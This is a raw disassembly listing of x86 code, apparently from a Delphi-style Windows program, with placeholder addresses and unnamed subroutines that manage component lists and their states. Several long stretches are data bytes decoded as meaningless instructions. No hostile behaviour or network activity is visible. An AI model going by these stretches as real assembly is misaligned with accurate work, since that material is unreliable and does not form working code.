mov edx [ r-xdata ]
call sub_40496c
mov eax rw-data
call sub_403eb8
mov eax rw-data
call sub_403eb8
sub_454830
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4548b6
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4548bd
retn
call GetVersion
and eax 0xff
cmp ax 0x4
setae [ rw-data ]
call sub_4545e0
mov eax [ r-xdata ]
call sub_417d34
mov eax [ r-xdata ]
call sub_417dd4
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417d80
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417d80
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417d80
sub_454b04
stc
push ebx
push eax
push esp
push ebp
inc ebp
add [ esi + edx * 2 ] bh
inc ebp
add [ eax + 0x58 ] al
inc ebp
add [ eax + 0x58 ] ah
inc ebp
add [ ecx ] dl
push esp
inc ebx
jne r-xdata
inc eax
add [ eax + 0x33 ] bh
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ ebp + edx * 2 - 0x7207ffbb ] ah
inc ecx
add [ eax + 0x14004210 ] dh
lea eax [ ecx ]
mov [ ecx ] dl
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080004 ] al
outsb
inc ebx
push 0x65676e61
in al 0x49
inc ebp
add [ eax ] cl
add bh bh
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090005 ] al
outsb
inc ebp
js r-xdata
outsd
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
sub al 0x4b
inc ebp
add [ eax ] cl
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x64b00006
inc ebp
add [ eax ] bh
add [ eax ] al
push [ eax + eax ]
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
push es
dec ecx
insd
popad
jae r-xdata
test [ ebx ] dh
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
dec ebp
inc ebp
add [ eax ] dh
add [ eax ] al
add [ 0x33700041 ] bl
inc eax
add [ ebx + esi + 0x40 ] bh
arpl [ ebp + 0x74 ] si
loopne r-xdata
add [ eax ] al
inc [ ecx ]
dec edx
inc ebp
add [ eax ] bl
add bh bh
sbb [ eax + 0x45 ] 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add eax 0x74617453
loopne r-xdata
inc edx
add al cl
push esi
inc ebp
add [ eax - 0x6fffbdef ] bl
adc al [ edx ]
aam 0x14
inc edx
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
add [ ecx * 4 + 0x11880041 ] dl
outsd
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
lodsb [ esi ]
outsb
inc ecx
add [ edx ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x4ba40000
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
dec ebx
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
dec ebx
inc ebp
add [ eax ] ch
add [ eax ] al
jl r-xdata
lodsb [ esi ]
inc ecx
add [ ebp * 4 - 0x59f3ffbf ] bl
inc ecx
add [ eax - 0x53 ] bl
inc ecx
add ah cl
lodsd [ esi ]
inc ecx
add al bh
popad
inc ebp
add ah bh
cmpsd [ esi ] [ edi ]
inc ecx
add [ eax - 0x67 ] al
inc ecx
add [ eax - 0x27ffbe58 ] bl
test al 0x41
add [ ecx + ebp * 4 + 0x41 ] al
add [ esi + ebx * 4 + 0x41 ] ch
add ah dl
stosb [ edi ]
inc ecx
add [ eax ] al
mov eax [ 0xffffffffa1d40041 ]
inc ecx
add [ eax ] dl
stosd [ edi ]
inc ecx
add [ eax ] ah
stosd [ edi ]
inc ecx
add [ eax ] bh
mov [ 0xffffffffa28c0041 ] al
inc ecx
add [ eax ] bh
mov [ 0xffffffffa4d00041 ] eax
inc ecx
add [ eax ] ch
movsd [ edi ] [ esi ]
inc ecx
add [ ebp - 0x579fffbf ] bh
inc ecx
add [ eax + ebp * 4 + 0x41 ] bh
add [ ebx + ebp * 4 + 0x41 ] dh
add ah al
test eax 0xad840041
inc ecx
add [ ebp + ebp * 4 + 0x540d0041 ] dl
push ebx
push 0x4374726f
jne r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ edi - 0x7207ffbf ] dl
inc ecx
add [ eax ] al
fwait
inc ecx
add al bh
cdq
inc ecx
add [ edx + ebp * 4 ] bh
inc ecx
add [ eax - 0x56 ] dh
add [ eax ] al
add [ eax ] al
fmul [ ebp + 0x45 ]
inc ecx
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0006 ] al
outsb
push ebx
je r-xdata
inc ecx
add [ eax ] al
add bh bh
inc eax
fcom [ edx + eax * 2 ]
add [ eax ] bh
push ebp
inc ebp
add [ edi + edx * 2 + 0x45 ] cl
add [ eax + 0xb004556 ] cl
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
or edx [ ecx + eax * 2 + 0x63 ]
je r-xdata
inc ebp
add [ esp + edx + 0x337c0042 ] bh
inc eax
add ah bh
or eax 0x33840042
add [ eax ] al
fmul [ esi + 0x45 ]
dec esp
imul esi [ ebx + 0x74 ] 0x4ddcc08b
inc ebp
add [ edi ] al
or eax 0x6f685354
jb r-xdata
add [ eax - 0x7bffbfcd ] al
je r-xdata
add [ eax ] al
xchg esp eax
adc [ eax ] al
jl r-xdata
add [ edi + ecx * 2 ] cl
inc ebp
add [ eax - 0x40000000 ] ah
dec eax
inc ebp
add [ esp + edx + 0x337c0042 ] bh
inc eax
add ah bh
or eax 0x33840042
inc eax
add [ eax + 0x33 ] bh
dec [ esi + 0x45 ]
inc ebx
jne r-xdata
xor eax [ eax ]
js r-xdata
inc ebx
push 0x65676e61
in al 0x49
inc ebp
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080007 ] al
outsb
push ebp
jo r-xdata
add [ eax ] al
add al [ eax ]
out dx al
dec esp
imul esi [ ebx + 0x74 ] r-xdata
or al 0x66
inc ecx
add [ eax ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x4e040000
inc ebp
add [ eax ] cl
or dl [ eax + ecx * 2 + 0x69 ]
outsb
je r-xdata
inc ecx
add [ edx + ebp * 4 + 0x41 ] dh
popad
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh bh
dec esi
inc ebp
jbe r-xdata
add [ eax - 0x56 ] bh
inc ecx
add al al
sahf
inc ecx
add ah ch
stosd [ edi ]
inc ecx
add [ eax - 0x54 ] cl
inc ecx
lea eax [ eax ]
xor [ ebp + 0x45 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
dec ebp
inc ebp
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ edx + ebx * 2 + 0x45 ] ch
add [ edx + ebx * 2 + 0x10b00045 ] bh
inc edx
add [ ecx * 4 + 0x11880041 ] dl
add [ ebx + esi + 0x33780040 ] al
outsb
je r-xdata
add al [ ecx ]
pop es
dec eax
imul ebp [ esi + 0x74 ] 0x6727453
push ebx
je r-xdata
inc edx
add al bh
push ss
inc edx
add [ ebx + edx * 2 + 0x60980045 ] cl
inc ebp
add ah dl
adc al 0x42
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add [ eax ] bl
pop edx
inc ebp
add [ eax + 0x5c004217 ] bh
pop ss
inc edx
add al dh
push ss
inc edx
add [ eax ] ah
pop ss
inc edx
add ah dh
push ss
inc edx
add al ah
push esp
inc ebp
add al al
pop esi
inc ebp
add [ eax + 0x5e ] bl
inc ebp
add ah ch
popad
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x640040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
js r-xdata
lea eax [ ecx ]
mov [ ecx ] dl
add [ eax ] ah
dec edi
inc ebp
add [ eax ] al
imul ebp [ esi + 0x67 ] 0x61430701
outsb
push ebx
push 0x4207776f
outsd
outsd
insb
popad
outsb
add [ eax + edx + 0x10000040 ] dl
inc eax
add [ eax + 0x454e ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
dec esi
inc ebp
sub_455250
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ ebx + 0x45 ] dl
add [ eax ] bl
add [ eax ] al
add [ eax ] dl
outsd
inc ecx
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
pop ecx
inc ebp
add [ eax + 0x59 ] cl
inc ebp
add [ ecx + ebx * 2 + 0x45 ] bl
add [ eax + 0x59 ] dh
inc ebp
add [ ecx + ebx * 2 + 0x59980045 ] al
inc ebp
add [ ecx + ebx * 2 + 0x59c00045 ] ch
inc ebp
add ah dl
pop ecx
inc ebp
add al ch
pop ecx
inc ebp
add ah ch
pop ecx
inc ebp
add al dh
pop ecx
inc ebp
add ah dh
pop ecx
inc ebp
add al bh
pop ecx
inc ebp
add ah bh
pop ecx
inc ebp
add [ eax ] al
pop edx
inc ebp
add [ edx + ebx * 2 ] al
inc ebp
add [ eax ] cl
pop edx
inc ebp
add [ edx + ebx * 2 ] cl
inc ebp
add [ eax ] dl
pop edx
inc ebp
add [ edx + ebx * 2 ] dl
inc ebp
add [ ebx ] cl
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0xd1e85653
loope sub_45531c
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax - 0x5bffbdeb ] ch
adc eax 0x15dc0042
inc edx
add [ esi + edx ] bh
inc edx
add [ eax ] dl
push ss
inc edx
add [ eax + 0x16 ] al
inc edx
add [ eax + 0x15 ] ah
inc edx
add ah dh
adc eax 0x16480042
inc edx
add [ eax ] ah
pop ecx
inc ebp
add [ ecx + ebx * 2 ] dh
dec [ ebx - 0x740f7426 ]
inc esi
pop esp
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_421698
test bl bl
jle r-xdata
mov edx esi
call sub_455730
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_45531c
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov eax [ esi + 0x5c ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_421698
test bl bl
jle r-xdata
mov edx esi
call sub_455730
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_45538c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_421198
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebx
call sub_455434
sub_4553c0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_455350
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x5c ]
mov edi [ edx + 0x30 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_4185f0
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x30 ]
mov ecx ebx
mov edx esi
call sub_41877c
sub_455408
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x58 ]
call sub_4042c4
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x58 ]
mov edx esi
call sub_403f0c
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x30 ]
sub_455434
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x5c ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_455730
mov edx ebx
mov eax esi
call sub_455710
sub_45545c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_455434
sub_455488
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_46a8ac
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff3
call sub_403324
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_421724
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb040
call sub_445e68
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4554e0
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_46a8d4
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff0
call sub_403324
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_421740
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb03f
call sub_445e68
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_455538
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_420d38
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebx + 0x30 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_4556bc
mov [ ebx + 0x58 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_4555a4
push ebx
push esi
push edi
call sub_4034f4
mov ebx edx
mov edi eax
mov eax [ edi + 0x34 ]
call sub_403128
jmp r-xdata
mov esi [ edi + 0x30 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_4187e8
call sub_403128
mov eax [ edi + 0x30 ]
call sub_403128
mov edx ebx
and dl 0xfc
mov eax edi
call sub_420d84
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4034dc
sub_4555f4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_45563c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_41875c
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4032d8
mov edx edi
call sub_4553c0
sub_455688
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x38 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x34 ]
call sub_4575f0
pop esi
pop ebx
retn
mov edx [ ebx + 0x34 ]
call sub_457634
mov edx ebx
mov eax [ ebx + 0x38 ]
call sub_420e08
sub_4556c8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_421054
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x38 ]
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax esi
call sub_455730
sub_455710
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_4185a4
mov [ esi + 0x5c ] ebx
mov edx ebx
mov eax esi
call sub_420e08
pop esi
pop ebx
retn
sub_455730
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_41889c
test eax eax
jl r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x5c ] eax
sub_45574c
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
test [ ebx + 0x1c ] 0x10
je r-xdata
inc esi
xor edi edi
pop edi
pop esi
pop ebx
retn
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
dec esi
jne r-xdata
cmp [ esi + 0x250 ] 0x0
je r-xdata
mov eax [ esi + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_4557b4
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esi + 0x8 ]
call sub_4606c0
mov ebx eax
mov ax [ esi + 0x4 ]
mov edx ebx
call sub_458e8c
mov ebp eax
test bp bp
je r-xdata
xor eax eax
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp bp [ ebx + 0x84 ]
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + edi * 4 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
jmp r-xdata
cmp [ ebx + 0x90 ] 0x0
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_45616c
mov edx ebp
call sub_456260
inc eax
je r-xdata
sub_455840
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x4a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_455860
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x52 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_455880
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x58 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x1 ] al
mov al [ esp ]
mov [ ebx + 0x58 ] al
cmp al 0x1
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
inc esi
xor ebp ebp
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
test edi edi
je r-xdata
dec al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
cmp [ esp + 0x1 ] 0x2
jne r-xdata
test edi edi
je r-xdata
jmp r-xdata
inc ebp
dec esi
jne r-xdata
mov dl [ edi + 0x94 ]
mov eax edi
call sub_455d30
cmp [ esp ] 0x2
jne r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov edi [ eax + ebp * 4 ]
mov al [ esp ]
sub al 0x1
jb r-xdata
mov al [ edi + 0x6a ]
mov [ edi + 0x94 ] al
mov dl 0x1
mov eax edi
call sub_455d30
sub_455a18
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_421654
mov [ esi + 0x6a ] 0x1
mov [ esi + 0x80 ] 0xffffffff
mov [ esi + 0x86 ] 0x1
xor eax eax
mov [ esi + 0x90 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_455a6c
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov eax [ esi + 0x98 ]
call sub_403128
mov eax [ esi + 0x9c ]
call sub_403128
cmp [ esi + 0x90 ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_45531c
test bl bl
jle r-xdata
lea eax [ esi + 0x90 ]
call sub_40d31c
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_455abc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_418df8
mov edx [ ebx + 0x64 ]
mov edi esi
mov eax edi
call sub_455bc8
mov dl [ ebx + 0x69 ]
mov eax edi
call sub_455c28
mov dl [ ebx + 0x6a ]
mov eax edi
call sub_455d30
mov edx [ ebx + 0x74 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x7c ]
mov eax edi
call sub_455f18
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_455f78
mov dx [ ebx + 0x84 ]
mov eax edi
call sub_455fd4
mov dl [ ebx + 0x86 ]
mov eax edi
call sub_456038
push [ ebx + 0x44 ]
push [ ebx + 0x40 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax [ ebx + 0x48 ]
mov [ edi + 0x48 ] eax
mov eax [ ebx + 0x4c ]
mov [ edi + 0x4c ] eax
mov eax [ ebx + 0x38 ]
mov [ edi + 0x38 ] eax
mov eax [ ebx + 0x3c ]
mov [ edi + 0x3c ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_455b68
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x95 ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebp + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebp + 0x95 ] bl
mov eax ebp
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_418700
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_418700
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
sub_455bc8
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x64 ]
call sub_4042c4
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x64 ]
mov edx [ esp ]
call sub_403f0c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4032d8
test eax eax
je r-xdata
sub_455c28
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x68 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x1
xor edx edx
push ebp
push sub_455d20
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x69 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x69 ] bl
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jle r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x69 ] 0x0
je r-xdata
inc esi
dec edi
jne r-xdata
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
call sub_455680
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_4032d8
test eax eax
je r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov edx esi
call sub_45566c
mov ebx eax
cmp ebx [ ebp - 0x4 ]
je r-xdata
mov eax [ ebx + 0x6c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x6c ]
jne r-xdata
xor edx edx
mov eax ebx
call sub_455c28
sub_455d30
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x6a ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov dl [ eax + 0x58 ]
cmp dl 0x1
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
cmp dl 0x2
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
jmp r-xdata
inc edi
dec esi
jne r-xdata
mov dl [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov [ esp ] 0x1
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4032d8
test eax eax
je r-xdata
sub_455da8
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x6c ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ ebx + 0x6c ] eax
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4032d8
test eax eax
